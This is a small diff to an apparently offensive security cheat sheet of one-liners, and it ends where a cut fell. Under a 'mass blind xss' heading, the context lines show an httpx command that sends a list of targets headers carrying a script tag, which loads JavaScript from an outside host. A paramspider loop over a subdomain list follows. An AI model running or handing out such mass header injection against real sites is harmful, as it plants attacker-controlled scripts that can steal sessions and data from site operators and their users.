@@ -69,6 +69,7 @@ order: 3
 
 ### mass blind xss
 + ``cat targets.txt| httpx -H "User-Agent: \"<script src=https://js.rip/0xmaruf></script>" -H "Host: \"<script src=https://js.rip/0xmaruf></script>" -H "Referer: \"<script src=https://js.rip/0xmaruf></script>" -H "Origin: \"<script src=https://js.rip/0xmaruf></script>"
+``
 
 ### Paramspider and kxss oneliners
 + ``for URL in $(</home/kali/Desktop/subdomains.txt); do (python3 paramspider.py -d "${URL}");
